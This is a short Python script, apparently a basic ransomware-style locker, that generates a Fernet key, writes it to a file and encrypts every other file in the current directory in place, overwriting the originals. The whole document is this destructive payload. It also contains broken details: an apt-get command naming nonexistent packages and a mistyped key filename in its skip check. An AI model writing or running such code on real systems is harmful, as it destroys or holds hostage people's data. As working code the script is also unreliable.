#!/usr/bin/env python3                            
import os
os.system('sudo apt-get install cryptography Fernet')
from cryptography.fernet import Fernet

files = []
for file in os.listdir():
        if file == "enc.py" or file == "dec.py" or file == "enckey. key" :         
                continue
        if os.path.isfile(file):
                files.append(file)

key=Fernet.generate_key()

with open("enckey.key" , mode="wb") as k:
        k.write(key)

for i in files:                                           
        with open(i , mode="rb") as en:
                contents=en.read() 
        cont=Fernet(key).encrypt(contents)


        with open(i , mode = "wb") as enn:
                enn.write(cont)
